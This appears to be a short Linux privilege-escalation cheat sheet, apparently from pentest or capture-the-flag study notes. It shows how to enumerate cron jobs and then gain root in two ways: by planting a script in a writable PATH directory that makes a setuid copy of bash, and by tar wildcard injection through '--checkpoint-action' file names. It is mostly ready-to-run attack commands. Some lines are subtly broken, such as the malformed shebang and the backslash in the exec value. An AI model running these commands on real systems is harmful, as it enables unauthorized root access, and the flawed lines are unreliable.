To get scheduled tasks:
~~~
cat /etc/crontab
~~~

Systemd timers:
~~~
systemctl list-timers --all
~~~

Look for tasks running frequently.

---
## Exploitation
Choose program from crontab.
Check path.
Put this in front of path:
~~~
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > {path to first writable path in $PATH}/{program}

chmod +x {path to program}

ls -la /tmp/bash
~~~
If overwritten:
~~~
/tmp/bash -p
~~~
We get root.

---
## Cron wildcards
If a cron job's program contains a wildcard (\*) we can use injection.
eg.:
~~~bash
#!bin/bash
cd /home/user
tar zcf /tmp/backup.tar.gz *
~~~

~~~
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh

chmod +x runme.sh

ls -la /tmp/bash
~~~

Injection:
~~~
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
~~~

~~~
/tmp/bash -p
~~~

We get root.